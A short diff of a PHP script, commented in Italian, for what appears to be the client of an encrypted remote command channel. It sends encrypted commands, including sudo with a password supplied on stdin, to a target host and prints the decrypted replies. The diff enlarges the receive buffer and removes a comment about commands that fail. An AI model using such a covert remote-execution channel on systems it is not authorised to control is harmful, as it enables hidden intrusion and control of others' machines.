@@ -18,8 +18,6 @@ while (true) {
     /   sudo <password> | sudo -S <comando>
     /   -S, --stdin      read password from standard input
     /
-    /   alcuni comandi non funzionano perche php non ha accesso ad alcuni file
-    /   ad esempio non funziona:ifconfig, ip addr, ls /etc
     */
 
     // cifro e mando il comando
@@ -28,7 +26,7 @@ while (true) {
 
     // ricevo e decripto la risposta
     $buf = "";
-    socket_recvfrom($sock, $buf, 1024, 0, $target, $port);
+    socket_recvfrom($sock, $buf, 8192, 0, $target, $port);
     $response = openssl_decrypt($buf, $method, $key, 0, $vettore);
     echo "Risposta: $response\n";
 }
